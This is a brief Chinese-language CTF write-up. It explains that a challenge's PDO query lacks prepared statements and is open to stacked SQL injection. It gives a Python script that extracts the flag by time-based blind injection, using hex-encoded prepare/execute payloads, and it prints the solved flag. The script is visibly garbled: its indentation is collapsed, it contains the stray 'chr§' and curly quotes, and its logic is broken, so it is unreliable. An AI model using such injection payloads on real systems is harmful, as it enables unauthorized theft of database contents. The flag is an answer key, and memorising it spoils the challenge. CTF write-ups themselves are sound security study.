
# writeup

本题出现了PDO, 是使用sql函数连接数据库以外的一种数据库通信方式

但是没有使用sql预编译, 所以存在堆叠注入

通过以下脚本来获取flag [x]

```python
#coding:utf-8
import requests
import time

url = 'http://127.0.0.1/?id=1;'
flag = ''

def xx(n,i,j):
    global flag
    p=(i+j)/2
    if j-i==1:
        flag+=chr(j)
        n+=1
    return

payload="""select if(substr((select binary flag from flag),{n},1)>’{p}’,sleep(0.3),0)""".format(p=chr§,n=n)
payload="""set%20%40z=0x%s;prepare+a+from%20%40z;execute+a;"""%payload.encode('hex')

t1=time.time()
r=requests.get(url+payload).text
t2=time.time()

if t2-t1>0.3:
    xx(n,p,j)
else:
    xx(n,i,p)

for n in range(1,1000):
    xx(n,1,128)

print flag
```

`flag{87550dc4958d56e12f5d1a69070f01affb07df35a9da39adb6328facd3662193}`
